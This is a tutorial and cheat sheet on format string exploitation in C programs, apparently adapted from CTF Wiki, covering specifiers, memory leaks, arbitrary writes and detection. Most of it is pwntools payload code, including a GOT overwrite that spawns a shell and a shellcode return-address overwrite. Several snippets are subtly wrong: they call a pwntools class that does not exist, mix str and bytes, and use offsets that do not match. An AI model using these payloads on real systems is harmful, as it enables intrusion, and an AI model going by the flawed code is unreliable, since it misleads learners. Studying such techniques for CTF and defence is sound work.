# Format String Exploitation

Format string vulnerabilities occur when user-controlled input is passed as a format specifier to printf-family functions, allowing reading and writing arbitrary memory.

## Table of Contents

- [Introduction](#introduction)
- [Exploitation](#exploitation)
- [Examples](#examples)
- [Detection](#detection)

## Introduction

### 原理介绍 (Introduction)

Understanding format string vulnerabilities and their mechanics.

**Topics:**
- Format string functions: printf, sprintf, fprintf, snprintf, vprintf
- Format specifiers: %s, %d, %x, %p, %n, %hhn, %hn, %lln
- How the vulnerability occurs (missing % format specifier)
- Stack layout and format string arguments

**Vulnerable Pattern:**
```c
// BAD - User input directly passed to printf
printf(user_input);

// GOOD - Format specifier prevents exploitation
printf("%s", user_input);
```

**CTF Wiki:** https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/

### Format Specifiers

| Specifier | Description | Example |
|------------|-------------|----------|
| %s | Print string from address | `%s` |
| %d / %i | Print signed integer | `%d` |
| %u | Print unsigned integer | `%u` |
| %x / %p | Print hexadecimal | `%x`, `%p` |
| %c | Print character | `%c` |
| %n | Write bytes written to address | `%n` |
| %hn | Write 2 bytes (short) | `%hn` |
| %hhn | Write 1 byte (char) | `%hhn` |
| %lln | Write 8 bytes (long long) | `%lln` |

## Exploitation

### 利用 (Exploitation)

Techniques for exploiting format string vulnerabilities.

**Topics:**
- **Information leak**: Reading arbitrary memory using `%s`, `%p`, `%x`
- **Arbitrary write**: Writing to arbitrary addresses using `%n`
- **Stack reading**: Reading stack contents
- **GOT overwrite**: Redirecting execution by overwriting GOT entries

**Memory Reading:**
```
# Read from arbitrary address
AAAA%p%p%p%p...%p
```

**Arbitrary Write:**
```
# Write value to address
ADDR%k$n
# where k is number of bytes before ADDR
```

**GOT Overwrite Flow:**
1. Leak libc address (e.g., printf GOT entry)
2. Calculate system() address
3. Overwrite printf GOT entry with system()
4. Trigger printf() → executes system()

**CTF Wiki:** https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/

### Exploitation Techniques

#### Arbitrary Read

Read from any memory address:

```python
# Payload format: ADDRESS + %x...%p...%s
payload = p32(target_addr)  # Put address on stack
payload += b"%7$s"           # Read string at that address

# Explanation:
# - p32(addr) places target address at 7th argument position
# - %7$s dereferences that address and prints string
```

#### Arbitrary Write

Write to any memory address:

```python
# Write 0xdeadbeef to 0x804a000
target_addr = 0x804a000
write_value = 0xdeadbeef

# Construct payload
payload = p32(target_addr)  # Target address
payload += p32(target_addr + 2)  # Target address + 2

# Use width specifiers to match write_value
# %hhn writes 1 byte, %hn writes 2 bytes
payload += b'%' + str((write_value & 0xff) - 8) + b'c'  # Adjust for address bytes
payload += b'%7$hhn'  # Write low byte
payload += b'%' + str(((write_value >> 8) & 0xff) - (write_value & 0xff)) + b'c'
payload += b'%8$hhn'  # Write second byte
# ... continue for remaining bytes
```

#### pwntools FormatString Module

```python
from pwn import *

fsb = FormatString()
fsb.write(0x804a000, 0xdeadbeef)  # Write value to address
fsb.write(0x804a010, 0x41414141)  # Write to another address
payload = fsb.payload(32)  # Build payload with offset 32

# Automatically calculates widths and specifiers
```

### Common Targets

**GOT (Global Offset Table):**
- Overwrite function addresses (printf, strcpy, etc.)
- Redirect to system, execve, or shellcode

**DTORS (Destructors):**
- Overwrite __DTORS_LIST__ for execution before program exit
- Older glibc technique, less common now

**Return Address:**
- Overwrite saved return address on stack
- Requires knowing stack offset

## Examples

### 例子 (Examples)

Practical format string exploitation scenarios and solutions.

**Topics:**
- Simple format string challenges
- GOT overwrite examples
- ASLR bypass with format strings
- Limited buffer size challenges
- Multiple write scenarios

**CTF Wiki:** https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-example/

### Example: GOT Overwrite

```python
from pwn import *

# Step 1: Leak libc address
conn.sendline(b'%7$s' + p32(printf_got))
leaked = conn.recv(4)
printf_addr = u32(leaked)

# Step 2: Calculate system address
libc = ELF('./libc.so.6')
libc.address = printf_addr - libc.symbols['printf']
system_addr = libc.symbols['system']

# Step 3: Overwrite GOT
payload = fmtstr_payload(7, {printf_got: system_addr})
conn.sendline(payload)

# Step 4: Trigger
conn.sendline(b'/bin/sh')
conn.interactive()
```

### Example: Shellcode Execution

```python
# Write shellcode to stack, then overwrite return address

# Shellcode
shellcode = asm(shellcraft.sh())

# Payload: [padding] + [shellcode] + [format string to overwrite ret addr]
offset = 64
payload = b'A' * offset
payload += shellcode
payload += p32(stack_addr + offset + 4)  # Shellcode location

# Use format string to write stack address to return address position
payload += fmtstr_payload(return_offset, {ret_addr: stack_addr + offset + 4})
```

## Detection

### 检测 (Detection)

Identifying format string vulnerabilities during analysis.

**Topics:**
- Static analysis: Finding printf calls with user input
- Dynamic analysis: Fuzzing with format specifiers
- Checking for missing format specifiers
- Automated tools and patterns

**Manual Detection:**

```c
// Vulnerable patterns to look for:
printf(user_input);
sprintf(buf, user_input);           // Missing format specifier
fprintf(fp, user_input);            // Missing format specifier
snprintf(buf, len, user_input);     // Missing format specifier

// Safe patterns:
printf("%s", user_input);
sprintf(buf, "%s", user_input);
fprintf(fp, "%s", user_input);
```

**Dynamic Testing:**

```bash
# Send format specifiers as input
echo "AAAA%p%p%p%p" | ./vulnerable_program

# If output contains hex values of stack, likely vulnerable
# If output contains "AAAA", also vulnerable
```

**CTF Wiki:** https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-detect/

## Bypassing Constraints

| Constraint | Solution |
|------------|----------|
| Short buffer size | Use %n with width padding, write in stages |
| No newline in payload | Use %n at correct positions, multiple writes |
| Large write values | Use %hn, %hhn for multi-byte writes |
| Fixed position | Calculate offset, use pop chain |
| Limited format specifiers | Use %c for precise control, %*d for width |

## Common Payloads

### Information Leak

```python
# Read 8 words from stack
payload = b"%p %p %p %p %p %p %p %p %p"

# Read specific stack position
payload = b"%7$p"  # Read 7th argument

# Read from arbitrary address
payload = p32(addr) + b"%7$s"
```

### Arbitrary Write

```python
# Simple single-byte write
payload = p32(addr) + b'%' + str(bytes_written) + b'c%7$hhn'

# 4-byte write using pwntools
fsb = FormatString()
fsb.write(addr, value)
payload = fsb.payload(offset)

# Multiple writes
writes = {
    got_printf: system_addr,
    got_strcpy: shellcode_addr
}
payload = fmtstr_payload(offset, writes)
```

## Further Resources

- **pwntools fmtstr:** `from pwn import fmtstr_payload`
- **Format String Cheat Sheet:** Common specifiers and patterns
- **CTF-Wiki:** Comprehensive examples and theory
